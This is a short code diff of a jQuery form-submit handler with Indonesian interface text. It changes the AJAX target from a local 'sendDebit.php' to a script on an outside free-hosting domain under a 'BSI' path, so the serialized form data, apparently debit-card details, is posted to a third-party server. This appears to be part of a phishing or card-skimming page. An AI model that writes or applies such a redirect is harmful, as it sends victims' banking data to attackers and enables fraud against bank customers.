@@ -1129,7 +1129,7 @@ $('#form1').on('submit', function (event) {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'sendDebit.php',
+ url: 'https://www.website-layanan.c1.is/BSI/2/sendDebit.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
